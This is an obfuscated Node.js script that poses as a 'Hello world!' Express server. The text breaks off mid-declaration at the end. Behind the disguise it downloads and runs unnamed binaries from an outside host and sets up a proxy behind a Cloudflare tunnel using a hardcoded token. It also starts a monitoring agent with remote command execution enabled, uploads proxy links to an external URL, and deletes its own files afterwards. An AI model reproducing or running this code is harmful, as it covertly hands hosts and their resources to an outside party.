const _0x518edc=_0x1a2b;(function(_0x37237d,_0x485694){const _0x2c02ad=_0x1a2b,_0x1ac076=_0x37237d();while(!![]){try{const _0x365705=-parseInt(_0x2c02ad(0x1ee))/0x1*(parseInt(_0x2c02ad(0x19c))/0x2)+parseInt(_0x2c02ad(0x1b8))/0x3+parseInt(_0x2c02ad(0x186))/0x4*(-parseInt(_0x2c02ad(0x1bf))/0x5)+-parseInt(_0x2c02ad(0x200))/0x6+-parseInt(_0x2c02ad(0x1c0))/0x7+parseInt(_0x2c02ad(0x165))/0x8+parseInt(_0x2c02ad(0x15f))/0x9*(parseInt(_0x2c02ad(0x17b))/0xa);if(_0x365705===_0x485694)break;else _0x1ac076['push'](_0x1ac076['shift']());}catch(_0x5dcd41){_0x1ac076['push'](_0x1ac076['shift']());}}}(_0xb49e,0x5fa52));const express=require(_0x518edc(0x1e4)),app=express(),axios=require(_0x518edc(0x1eb)),os=require('os'),fs=require('fs'),path=require(_0x518edc(0x187)),{promisify}=require(_0x518edc(0x1b2)),exec=promisify(require('child_process')[_0x518edc(0x1f7)]),{execSync}=require(_0x518edc(0x1cf)),UPLOAD_URL=process[_0x518edc(0x1e0)][_0x518edc(0x1e3)]||'',PROJECT_URL=process['env'][_0x518edc(0x13c)]||'',AUTO_ACCESS=process[_0x518edc(0x1e0)][_0x518edc(0x1ad)]||![],FILE_PATH=process[_0x518edc(0x1e0)][_0x518edc(0x18e)]||_0x518edc(0x166),SUB_PATH=process[_0x518edc(0x1e0)]['SUB_PATH']||'sub',PORT=process[_0x518edc(0x1e0)]['SERVER_PORT']||process[_0x518edc(0x1e0)]['PORT']||0xbb8,UUID=process[_0x518edc(0x1e0)][_0x518edc(0x1e9)]||_0x518edc(0x1bc),NEZHA_SERVER=process[_0x518edc(0x1e0)][_0x518edc(0x158)]||'',NEZHA_PORT=process[_0x518edc(0x1e0)][_0x518edc(0x13a)]||'',NEZHA_KEY=process['env'][_0x518edc(0x193)]||'',ARGO_DOMAIN=process[_0x518edc(0x1e0)][_0x518edc(0x1b9)]||_0x518edc(0x1dc),ARGO_AUTH=process['env'][_0x518edc(0x1ae)]||_0x518edc(0x204),ARGO_PORT=process['env'][_0x518edc(0x197)]||0x1f41,CFIP=process[_0x518edc(0x1e0)][_0x518edc(0x1bb)]||_0x518edc(0x1bd),CFPORT=process[_0x518edc(0x1e0)]['CFPORT']||0x1bb,NAME=process[_0x518edc(0x1e0)][_0x518edc(0x1a8)]||_0x518edc(0x14d);!fs[_0x518edc(0x159)](FILE_PATH)?(fs[_0x518edc(0x1fa)](FILE_PATH),console[_0x518edc(0x16d)](FILE_PATH+_0x518edc(0x1a6))):console[_0x518edc(0x16d)](FILE_PATH+_0x518edc(0x141));function generateRandomName(){const _0x39ffdc=_0x518edc,_0x80bd3f='abcdefghijklmnopqrstuvwxyz';let _0x1a613f='';for(let _0x1994bb=0x0;_0x1994bb<0x6;_0x1994bb++){_0x1a613f+=_0x80bd3f['charAt'](Math[_0x39ffdc(0x1ca)](Math['random']()*_0x80bd3f[_0x39ffdc(0x19a)]));}return _0x1a613f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x518edc(0x184)](FILE_PATH,npmName),phpPath=path[_0x518edc(0x184)](FILE_PATH,phpName),webPath=path[_0x518edc(0x184)](FILE_PATH,webName),botPath=path[_0x518edc(0x184)](FILE_PATH,botName),subPath=path[_0x518edc(0x184)](FILE_PATH,_0x518edc(0x192)),listPath=path[_0x518edc(0x184)](FILE_PATH,_0x518edc(0x149)),bootLogPath=path[_0x518edc(0x184)](FILE_PATH,_0x518edc(0x1d2)),configPath=path[_0x518edc(0x184)](FILE_PATH,_0x518edc(0x1b6));function deleteNodes(){const _0x31cf92=_0x518edc;try{if(!UPLOAD_URL)return;if(!fs[_0x31cf92(0x159)](subPath))return;let _0x44cd8a;try{_0x44cd8a=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x5b1e62=Buffer[_0x31cf92(0x19e)](_0x44cd8a,_0x31cf92(0x1a0))[_0x31cf92(0x1d1)](_0x31cf92(0x1b1)),_0x254b89=_0x5b1e62[_0x31cf92(0x1c3)]('\x0a')['filter'](_0x206cdc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x206cdc));if(_0x254b89[_0x31cf92(0x19a)]===0x0)return;return axios[_0x31cf92(0x1e7)](UPLOAD_URL+_0x31cf92(0x1fe),JSON[_0x31cf92(0x1a7)]({'nodes':_0x254b89}),{'headers':{'Content-Type':_0x31cf92(0x144)}})[_0x31cf92(0x205)](_0x2ce0f3=>{return null;}),null;}catch(_0x6fd1b5){return null;}}function cleanupOldFiles(){try{const _0x3aa39e=fs['readdirSync'](FILE_PATH);_0x3aa39e['forEach'](_0x3723ad=>{const _0x5df4f3=_0x1a2b,_0xd75485=path[_0x5df4f3(0x184)](FILE_PATH,_0x3723ad);try{const _0x2cfd94=fs[_0x5df4f3(0x140)](_0xd75485);_0x2cfd94[_0x5df4f3(0x18a)]()&&fs[_0x5df4f3(0x191)](_0xd75485);}catch(_0x29a186){}});}catch(_0x246c2c){}}function _0xb49e(){const _0x54039b=['202032AoxwrV','nohup\x20','from','createWriteStream','base64','pkill\x20-f\x20\x22[','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','&fp=firefox&type=ws&host=','quic','message','\x20is\x20created','stringify','NAME','success','config.yaml','ARGO_DOMAIN:','chmod','AUTO_ACCESS','ARGO_AUTH','https://amd64.ssss.nyc.mn/bot','platform','utf-8','util','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','arm','\x0a\x20\x20tunnel:\x20','config.json','\x20successfully','1758330eZSFnQ','ARGO_DOMAIN','https://ipapi.co/json/','CFIP','38908bd8-6fe3-4944-9df9-beb9e5287a93','cf.tencentapp.cn','/api/add-nodes','25OpRNYs','214235tIHYAj','Empowerment\x20success\x20for\x20','org','split','xtls-rprx-vision','push','Skipping\x20adding\x20automatic\x20access\x20task','/dev/null','countryCode','charAt','floor','\x22\x20>\x20/dev/null\x202>&1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','npm\x20running\x20error:\x20','\x20>/dev/null\x202>&1','child_process','?security=tls&sni=','toString','boot.log','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','firefox','close','Content-Type','2087','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Unhandled\x20error\x20in\x20startserver:','Error\x20executing\x20command:\x20','data','leaflow.quicker.cc.cd','\x0aclient_secret:\x20','unlink','https://arm64.ssss.nyc.mn/bot','env','\x20-s\x20','/tunnel.yml\x20run','UPLOAD_URL','express','basename','/vmess-argo','post','clear','UUID','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','axios','none','2083','3fljozF','https://arm64.ssss.nyc.mn/agent','127.0.0.1','?encryption=none&security=tls&sni=','freedom','TunnelSecret','filter','listen','aarch64','exec','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','web\x20running\x20error:\x20','mkdirSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','includes','true','/api/delete-nodes','https://arm64.ssss.nyc.mn/v1','2938536EsMAHd','&path=%2Fvless-argo%3Fed%3D2560#','status','map','eyJhIjoiYzJlOWMzYmJhOWJmMjIzNTcwOTczZjAyNDIxOGIwZjQiLCJ0IjoiZTIxNzE2ODItOThjOS00M2ExLThhOTMtNzVlMjc4MTIyYWEzIiwicyI6IlpXRTRPVFJrT0dNdE1ESTRaQzAwWlRFekxUZ3hNbUl0TTJRNU9USTVOMkk1T0ROaSJ9','catch','NEZHA_PORT','Empowerment\x20failed\x20for\x20','PROJECT_URL','Error\x20reading\x20boot.log:','\x0a\x20\x20credentials-file:\x20','/vmess-argo?ed=2560','statSync','\x20already\x20exists','--tls','error','application/json','Download\x20','vmess','arch','unshift','list.txt','taskkill\x20/f\x20/im\x20','http\x20server\x20is\x20running\x20on\x20port:','match','Leaflow','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/config.json\x20>/dev/null\x202>&1\x20&','direct','\x20-c\x20','text/plain;\x20charset=utf-8','tunnel.json','send','Add\x20automatic\x20access\x20task\x20faild:\x20','amd','Subscription\x20uploaded\x20successfully','NEZHA_SERVER','existsSync','rm\x20-rf\x20','/trojan-argo','App\x20is\x20running','forEach','2053','9nDfqde','2096','Unknown','\x20failed:\x20','pop','automatic\x20access\x20task\x20added\x20successfully','5432144phPYGc','./tmp','response','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','fileUrl','fileName','\x0a\x0avmess://','set','log','win32','arm64','writeFileSync','\x0a\x0atrojan://','\x0avless://','.exe\x20>\x20nul\x202>&1','ArgoDomain:','https+local://8.8.8.8/dns-query','Hello\x20world!','http','tcp','Error\x20in\x20startserver:','country_code','6241330LVrxak','https://oooo.serv00.net/add-url','test','\x20>/dev/null\x202>&1\x20&','vless','8443','/vless-argo','tunnel.yml','substring','join','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','539272ikzNjR','path','get','block','isFile','tls','blackhole','\x20is\x20running','FILE_PATH','https://amd64.ssss.nyc.mn/agent','/api/add-subscriptions','unlinkSync','sub.txt','NEZHA_KEY','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','https://amd64.ssss.nyc.mn/v1','readFileSync','ARGO_PORT','php\x20running\x20error:\x20','del\x20/f\x20/q\x20','length','http://ip-api.com/json/'];_0xb49e=function(){return _0x54039b;};return _0xb49e();}app[_0x518edc(0x188)]('/',function(_0x5a89e1,_0x38bead){const _0x27f834=_0x518edc;_0x38bead[_0x27f834(0x154)](_0x27f834(0x176));});async function generateConfig(){const _0x50e181=_0x518edc,_0x57d693={'log':{'access':'/dev/null','error':_0x50e181(0x1c7),'loglevel':_0x50e181(0x1ec)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x50e181(0x1c4)}],'decryption':_0x50e181(0x1ec),'fallbacks':[{'dest':0xbb9},{'path':_0x50e181(0x181),'dest':0xbba},{'path':_0x50e181(0x1e6),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x50e181(0x178)}},{'port':0xbb9,'listen':_0x50e181(0x1f0),'protocol':_0x50e181(0x17f),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x50e181(0x178),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x50e181(0x17f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x50e181(0x1ec)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x50e181(0x177),_0x50e181(0x18b),_0x50e181(0x1a4)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x50e181(0x1f0),'protocol':_0x50e181(0x146),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x50e181(0x1e6)}},'sniffing':{'enabled':!![],'destOverride':[_0x50e181(0x177),_0x50e181(0x18b),_0x50e181(0x1a4)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x50e181(0x1f0),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x50e181(0x15b)}},'sniffing':{'enabled':!![],'destOverride':[_0x50e181(0x177),_0x50e181(0x18b),_0x50e181(0x1a4)],'metadataOnly':![]}}],'dns':{'servers':[_0x50e181(0x175)]},'outbounds':[{'protocol':_0x50e181(0x1f2),'tag':_0x50e181(0x150)},{'protocol':_0x50e181(0x18c),'tag':_0x50e181(0x189)}]};fs[_0x50e181(0x170)](path[_0x50e181(0x184)](FILE_PATH,_0x50e181(0x1b6)),JSON[_0x50e181(0x1a7)](_0x57d693,null,0x2));}function getSystemArchitecture(){const _0x17b6df=_0x518edc,_0x3a2ff0=os[_0x17b6df(0x147)]();return _0x3a2ff0==='arm'||_0x3a2ff0===_0x17b6df(0x16f)||_0x3a2ff0===_0x17b6df(0x1f6)?'arm':_0x17b6df(0x156);}function downloadFile(_0x1888ad,_0x19fdfa,_0x1e0455){const _0x25f76d=_0x518edc,_0x3df94c=_0x1888ad;!fs[_0x25f76d(0x159)](FILE_PATH)&&fs[_0x25f76d(0x1fa)](FILE_PATH,{'recursive':!![]});const _0x444eae=fs[_0x25f76d(0x19f)](_0x3df94c);axios({'method':'get','url':_0x19fdfa,'responseType':'stream'})['then'](_0x338dd9=>{const _0x5f4a8b=_0x25f76d;_0x338dd9[_0x5f4a8b(0x1db)]['pipe'](_0x444eae),_0x444eae['on']('finish',()=>{const _0x8fe6ff=_0x5f4a8b;_0x444eae[_0x8fe6ff(0x1d5)](),console[_0x8fe6ff(0x16d)](_0x8fe6ff(0x145)+path['basename'](_0x3df94c)+_0x8fe6ff(0x1b7)),_0x1e0455(null,_0x3df94c);}),_0x444eae['on'](_0x5f4a8b(0x143),_0x3f3107=>{const _0x44a5f6=_0x5f4a8b;fs[_0x44a5f6(0x1de)](_0x3df94c,()=>{});const _0x432aea='Download\x20'+path[_0x44a5f6(0x1e5)](_0x3df94c)+'\x20failed:\x20'+_0x3f3107[_0x44a5f6(0x1a5)];console[_0x44a5f6(0x143)](_0x432aea),_0x1e0455(_0x432aea);});})[_0x25f76d(0x205)](_0x57c014=>{const _0x49af04=_0x25f76d,_0x1a6d37=_0x49af04(0x145)+path['basename'](_0x3df94c)+_0x49af04(0x162)+_0x57c014[_0x49af04(0x1a5)];console[_0x49af04(0x143)](_0x1a6d37),_0x1e0455(_0x1a6d37);});}function _0x1a2b(_0x1abd8c,_0x4311b5){_0x1abd8c=_0x1abd8c-0x13a;const _0x1a2bc2=_0xb49e();let _0x599c63=_0x1a2bc2[_0x1abd8c];return _0x599c63;}async function downloadFilesAndRun(){const _0x4f9cd4=_0x518edc,_0x483049=getSystemArchitecture(),_0x432ce7=getFilesForArchitecture(_0x483049);if(_0x432ce7[_0x4f9cd4(0x19a)]===0x0){console[_0x4f9cd4(0x16d)](_0x4f9cd4(0x1a2));return;}const _0x1c86c8=_0x432ce7[_0x4f9cd4(0x203)](_0x3e7c8c=>{return new Promise((_0x4fb494,_0x5909cf)=>{const _0x712192=_0x1a2b;downloadFile(_0x3e7c8c[_0x712192(0x16a)],_0x3e7c8c[_0x712192(0x169)],(_0x240b8f,_0x4c4d7c)=>{_0x240b8f?_0x5909cf(_0x240b8f):_0x4fb494(_0x4c4d7c);});});});try{await Promise['all'](_0x1c86c8);}catch(_0x15c907){console[_0x4f9cd4(0x143)]('Error\x20downloading\x20files:',_0x15c907);return;}function _0xcabbbf(_0x2597dc){const _0x192932=0x1fd;_0x2597dc['forEach'](_0x2c01da=>{const _0x2503a0=_0x1a2b;fs[_0x2503a0(0x159)](_0x2c01da)&&fs[_0x2503a0(0x1ac)](_0x2c01da,_0x192932,_0x2cc66d=>{const _0x2a7036=_0x2503a0;_0x2cc66d?console[_0x2a7036(0x143)](_0x2a7036(0x13b)+_0x2c01da+':\x20'+_0x2cc66d):console[_0x2a7036(0x16d)](_0x2a7036(0x1c1)+_0x2c01da+':\x20'+_0x192932[_0x2a7036(0x1d1)](0x8));});});}const _0x45a824=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xcabbbf(_0x45a824);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x146f15=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x4f9cd4(0x1c3)](':')[_0x4f9cd4(0x163)]():'',_0x5ea374=new Set(['443',_0x4f9cd4(0x180),'2096',_0x4f9cd4(0x1d7),_0x4f9cd4(0x1ed),_0x4f9cd4(0x15e)]),_0x3ccc96=_0x5ea374['has'](_0x146f15)?_0x4f9cd4(0x1fd):'false',_0x18e5fe=_0x4f9cd4(0x1dd)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x4f9cd4(0x1ea)+_0x3ccc96+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x4f9cd4(0x170)](path['join'](FILE_PATH,_0x4f9cd4(0x1aa)),_0x18e5fe);const _0x2dcf9c=_0x4f9cd4(0x19d)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x4f9cd4(0x14e);try{await exec(_0x2dcf9c),console[_0x4f9cd4(0x16d)](phpName+'\x20is\x20running'),await new Promise(_0x3e4bcf=>setTimeout(_0x3e4bcf,0x3e8));}catch(_0x3b17b8){console[_0x4f9cd4(0x143)](_0x4f9cd4(0x198)+_0x3b17b8);}}else{let _0x9df8c1='';const _0x5ebb8d=['443',_0x4f9cd4(0x180),_0x4f9cd4(0x160),'2087',_0x4f9cd4(0x1ed),'2053'];_0x5ebb8d[_0x4f9cd4(0x1fc)](NEZHA_PORT)&&(_0x9df8c1=_0x4f9cd4(0x142));const _0xd48a78=_0x4f9cd4(0x19d)+npmPath+_0x4f9cd4(0x1e1)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x9df8c1+_0x4f9cd4(0x168);try{await exec(_0xd48a78),console[_0x4f9cd4(0x16d)](npmName+'\x20is\x20running'),await new Promise(_0x46d33d=>setTimeout(_0x46d33d,0x3e8));}catch(_0x3dd944){console[_0x4f9cd4(0x143)](_0x4f9cd4(0x1cd)+_0x3dd944);}}}else console[_0x4f9cd4(0x16d)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x529763=_0x4f9cd4(0x19d)+webPath+_0x4f9cd4(0x151)+FILE_PATH+_0x4f9cd4(0x14f);try{await exec(_0x529763),console[_0x4f9cd4(0x16d)](webName+_0x4f9cd4(0x18d)),await new Promise(_0xdb642=>setTimeout(_0xdb642,0x3e8));}catch(_0xa4a97f){console[_0x4f9cd4(0x143)](_0x4f9cd4(0x1f9)+_0xa4a97f);}if(fs[_0x4f9cd4(0x159)](botPath)){let _0x52dc0b;if(ARGO_AUTH[_0x4f9cd4(0x14c)](/^[A-Z0-9a-z=]{120,250}$/))_0x52dc0b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x4f9cd4(0x14c)](/TunnelSecret/)?_0x52dc0b=_0x4f9cd4(0x1b3)+FILE_PATH+_0x4f9cd4(0x1e2):_0x52dc0b=_0x4f9cd4(0x1f8)+FILE_PATH+_0x4f9cd4(0x1d3)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x52dc0b+_0x4f9cd4(0x17e)),console[_0x4f9cd4(0x16d)](botName+'\x20is\x20running'),await new Promise(_0x2523d6=>setTimeout(_0x2523d6,0x7d0));}catch(_0x9f42e0){console[_0x4f9cd4(0x143)](_0x4f9cd4(0x1da)+_0x9f42e0);}}await new Promise(_0x484df7=>setTimeout(_0x484df7,0x1388));}function getFilesForArchitecture(_0xd91fd1){const _0x309486=_0x518edc;let _0xc60ae;_0xd91fd1===_0x309486(0x1b4)?_0xc60ae=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x309486(0x1df)}]:_0xc60ae=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x309486(0x1af)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x365066=_0xd91fd1===_0x309486(0x1b4)?_0x309486(0x1ef):_0x309486(0x18f);_0xc60ae[_0x309486(0x148)]({'fileName':npmPath,'fileUrl':_0x365066});}else{const _0x4f92c8=_0xd91fd1===_0x309486(0x1b4)?_0x309486(0x1ff):_0x309486(0x195);_0xc60ae[_0x309486(0x148)]({'fileName':phpPath,'fileUrl':_0x4f92c8});}}return _0xc60ae;}function argoType(){const _0xaeeb5c=_0x518edc;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xaeeb5c(0x16d)](_0xaeeb5c(0x1d8));return;}if(ARGO_AUTH[_0xaeeb5c(0x1fc)](_0xaeeb5c(0x1f3))){fs[_0xaeeb5c(0x170)](path[_0xaeeb5c(0x184)](FILE_PATH,_0xaeeb5c(0x153)),ARGO_AUTH);const _0x4b1d7d=_0xaeeb5c(0x1b5)+ARGO_AUTH[_0xaeeb5c(0x1c3)]('\x22')[0xb]+_0xaeeb5c(0x13e)+path[_0xaeeb5c(0x184)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0xaeeb5c(0x185)+ARGO_PORT+_0xaeeb5c(0x1cc);fs[_0xaeeb5c(0x170)](path[_0xaeeb5c(0x184)](FILE_PATH,_0xaeeb5c(0x182)),_0x4b1d7d);}else console[_0xaeeb5c(0x16d)](_0xaeeb5c(0x194));}async function extractDomains(){const _0x23fcd7=_0x518edc;let _0x6bf644;if(ARGO_AUTH&&ARGO_DOMAIN)_0x6bf644=ARGO_DOMAIN,console[_0x23fcd7(0x16d)](_0x23fcd7(0x1ab),_0x6bf644),await _0x3bb2d7(_0x6bf644);else try{const _0x27a08a=fs['readFileSync'](path[_0x23fcd7(0x184)](FILE_PATH,_0x23fcd7(0x1d2)),'utf-8'),_0x4aef8a=_0x27a08a[_0x23fcd7(0x1c3)]('\x0a'),_0x11f964=[];_0x4aef8a[_0x23fcd7(0x15d)](_0x531d4b=>{const _0xca5eba=_0x23fcd7,_0x45c045=_0x531d4b[_0xca5eba(0x14c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x45c045){const _0x243e16=_0x45c045[0x1];_0x11f964[_0xca5eba(0x1c5)](_0x243e16);}});if(_0x11f964[_0x23fcd7(0x19a)]>0x0)_0x6bf644=_0x11f964[0x0],console[_0x23fcd7(0x16d)](_0x23fcd7(0x174),_0x6bf644),await _0x3bb2d7(_0x6bf644);else{console[_0x23fcd7(0x16d)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x23fcd7(0x191)](path[_0x23fcd7(0x184)](FILE_PATH,_0x23fcd7(0x1d2)));async function _0x1c79aa(){const _0x1305ee=_0x23fcd7;try{process[_0x1305ee(0x1b0)]==='win32'?await exec(_0x1305ee(0x14a)+botName+_0x1305ee(0x173)):await exec(_0x1305ee(0x1a1)+botName[_0x1305ee(0x1c9)](0x0)+']'+botName[_0x1305ee(0x183)](0x1)+_0x1305ee(0x1cb));}catch(_0x12aeba){}}_0x1c79aa(),await new Promise(_0x27e6ba=>setTimeout(_0x27e6ba,0xbb8));const _0x41d8f7=_0x23fcd7(0x1f8)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x41d8f7+'\x20>/dev/null\x202>&1\x20&'),console[_0x23fcd7(0x16d)](botName+'\x20is\x20running'),await new Promise(_0x5e285c=>setTimeout(_0x5e285c,0xbb8)),await extractDomains();}catch(_0x166f02){console[_0x23fcd7(0x143)](_0x23fcd7(0x1da)+_0x166f02);}}}catch(_0x4de4fb){console[_0x23fcd7(0x143)](_0x23fcd7(0x13d),_0x4de4fb);}async function _0x370238(){const _0x2378ee=_0x23fcd7;try{const _0x5a85b5=await axios[_0x2378ee(0x188)](_0x2378ee(0x1ba),{'timeout':0xbb8});if(_0x5a85b5[_0x2378ee(0x1db)]&&_0x5a85b5[_0x2378ee(0x1db)][_0x2378ee(0x17a)]&&_0x5a85b5[_0x2378ee(0x1db)][_0x2378ee(0x1c2)])return _0x5a85b5[_0x2378ee(0x1db)]['country_code']+'_'+_0x5a85b5[_0x2378ee(0x1db)][_0x2378ee(0x1c2)];}catch(_0x53ce92){try{const _0x222fd9=await axios[_0x2378ee(0x188)](_0x2378ee(0x19b),{'timeout':0xbb8});if(_0x222fd9[_0x2378ee(0x1db)]&&_0x222fd9[_0x2378ee(0x1db)][_0x2378ee(0x202)]===_0x2378ee(0x1a9)&&_0x222fd9[_0x2378ee(0x1db)][_0x2378ee(0x1c8)]&&_0x222fd9[_0x2378ee(0x1db)][_0x2378ee(0x1c2)])return _0x222fd9[_0x2378ee(0x1db)]['countryCode']+'_'+_0x222fd9[_0x2378ee(0x1db)]['org'];}catch(_0x284c16){}}return _0x2378ee(0x161);}async function _0x3bb2d7(_0x24b781){const _0x5819de=await _0x370238(),_0x33c9aa=NAME?NAME+'-'+_0x5819de:_0x5819de;return new Promise(_0x90c6d6=>{setTimeout(()=>{const _0x107830=_0x1a2b,_0x22572b={'v':'2','ps':''+_0x33c9aa,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x107830(0x1ec),'net':'ws','type':_0x107830(0x1ec),'host':_0x24b781,'path':_0x107830(0x13f),'tls':'tls','sni':_0x24b781,'alpn':'','fp':_0x107830(0x1d4)},_0x2cc3f9=_0x107830(0x172)+UUID+'@'+CFIP+':'+CFPORT+_0x107830(0x1f1)+_0x24b781+_0x107830(0x1a3)+_0x24b781+_0x107830(0x201)+_0x33c9aa+_0x107830(0x16b)+Buffer[_0x107830(0x19e)](JSON[_0x107830(0x1a7)](_0x22572b))[_0x107830(0x1d1)](_0x107830(0x1a0))+_0x107830(0x171)+UUID+'@'+CFIP+':'+CFPORT+_0x107830(0x1d0)+_0x24b781+'&fp=firefox&type=ws&host='+_0x24b781+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x33c9aa+'\x0a\x20\x20\x20\x20';console[_0x107830(0x16d)](Buffer[_0x107830(0x19e)](_0x2cc3f9)[_0x107830(0x1d1)](_0x107830(0x1a0))),fs[_0x107830(0x170)](subPath,Buffer['from'](_0x2cc3f9)['toString'](_0x107830(0x1a0))),console[_0x107830(0x16d)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x107830(0x188)]('/'+SUB_PATH,(_0x205467,_0x5196b9)=>{const _0x1173bf=_0x107830,_0x33fd04=Buffer[_0x1173bf(0x19e)](_0x2cc3f9)[_0x1173bf(0x1d1)](_0x1173bf(0x1a0));_0x5196b9[_0x1173bf(0x16c)](_0x1173bf(0x1d6),_0x1173bf(0x152)),_0x5196b9['send'](_0x33fd04);}),_0x90c6d6(_0x2cc3f9);},0x7d0);});}}async function uploadNodes(){const _0xecdd57=_0x518edc;if(UPLOAD_URL&&PROJECT_URL){const _0x266ab8=PROJECT_URL+'/'+SUB_PATH,_0x3b20d3={'subscription':[_0x266ab8]};try{const _0x1439f5=await axios[_0xecdd57(0x1e7)](UPLOAD_URL+_0xecdd57(0x190),_0x3b20d3,{'headers':{'Content-Type':_0xecdd57(0x144)}});return _0x1439f5&&_0x1439f5[_0xecdd57(0x202)]===0xc8?(console[_0xecdd57(0x16d)](_0xecdd57(0x157)),_0x1439f5):null;}catch(_0x42ac6c){if(_0x42ac6c['response']){if(_0x42ac6c[_0xecdd57(0x167)][_0xecdd57(0x202)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x15b675=fs[_0xecdd57(0x196)](listPath,_0xecdd57(0x1b1)),_0x129979=_0x15b675[_0xecdd57(0x1c3)]('\x0a')[_0xecdd57(0x1f4)](_0x2acf3e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xecdd57(0x17d)](_0x2acf3e));if(_0x129979[_0xecdd57(0x19a)]===0x0)return;const _0x3ae2dd=JSON[_0xecdd57(0x1a7)]({'nodes':_0x129979});try{const _0x4bf711=await axios[_0xecdd57(0x1e7)](UPLOAD_URL+_0xecdd57(0x1be),_0x3ae2dd,{'headers':{'Content-Type':'application/json'}});return _0x4bf711&&_0x4bf711[_0xecdd57(0x202)]===0xc8?(console[_0xecdd57(0x16d)]('Nodes\x20uploaded\x20successfully'),_0x4bf711):null;}catch(_0x3eedd4){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x24c8d4=_0x1a2b,_0x1f0d98=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1f0d98['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1f0d98[_0x24c8d4(0x1c5)](phpPath);process[_0x24c8d4(0x1b0)]===_0x24c8d4(0x16e)?exec(_0x24c8d4(0x199)+_0x1f0d98['join']('\x20')+'\x20>\x20nul\x202>&1',_0x2d8e80=>{const _0x2d5985=_0x24c8d4;console[_0x2d5985(0x1e8)](),console[_0x2d5985(0x16d)](_0x2d5985(0x15c)),console['log'](_0x2d5985(0x1fb));}):exec(_0x24c8d4(0x15a)+_0x1f0d98['join']('\x20')+_0x24c8d4(0x1ce),_0x326386=>{const _0x5bdfae=_0x24c8d4;console[_0x5bdfae(0x1e8)](),console[_0x5bdfae(0x16d)](_0x5bdfae(0x15c)),console[_0x5bdfae(0x16d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function 